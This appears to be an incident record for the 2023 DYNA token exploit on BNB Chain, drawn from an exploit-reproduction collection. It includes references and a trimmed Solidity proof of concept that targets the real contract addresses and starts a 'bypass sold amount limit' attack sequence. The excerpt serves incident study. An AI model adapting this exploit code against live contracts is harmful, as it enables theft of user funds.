# [?] - DYNA - Business Logic Flaw

## Summary
Severity: Unknown
Chain: BNB Chain
Component: DYNA
Published: 2023-02-22
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/DYNA_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$21k
References:
- https://twitter.com/BlockSecTeam/status/1628319536117153794
- https://twitter.com/BeosinAlert/status/1628301635834486784
- https://bscscan.com/tx/0x06bbe093d9b84783b8ca92abab5eb8590cb2321285660f9b2a529d665d3f18e4
- https://bscscan.com/tx/0xc09678fec49c643a30fc8e4dec36d0507dae7e9123c270e1f073d335deab6cf0

```solidity
contract ContractTest is Test {
    IDYNA DYNA = IDYNA(0x5c0d0111ffc638802c9EfCcF55934D5C63aB3f79);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IStakingDYNA StakingDYNA = IStakingDYNA(0xa7B5eabC3Ee82c585f5F4ccC26b81c3Bd62Ff3a9);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xb6148c6fA6Ebdd6e22eF5150c5C3ceE78b24a3a0);
    StakingReward stakingReward;
    StakingReward[] StakingRewardList;
    uint256 flashLoanAmount;
    address DYNAOwner = 0xA8Ff6C807654c5B2B55f188e9a7Ce31C8d192353;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 25_879_486);
        cheats.label(address(DYNA), "DYNA");
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(Router), "Router");
        cheats.label(address(Pair), "Pair");
        cheats.label(address(StakingDYNA), "StakingDYNA");
    }

    function testExploit() external {
        StakingRewardFactory();
        DYNA.transfer(address(Pair), 1); //
        DYNA.transfer(tx.origin, 1e17);
        //
        cheats.startPrank(tx.origin);
        // Bypass Sold Amount Limit
        DYNA.transfer(address(Pair), 1); //
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/DYNA_exp.sol_
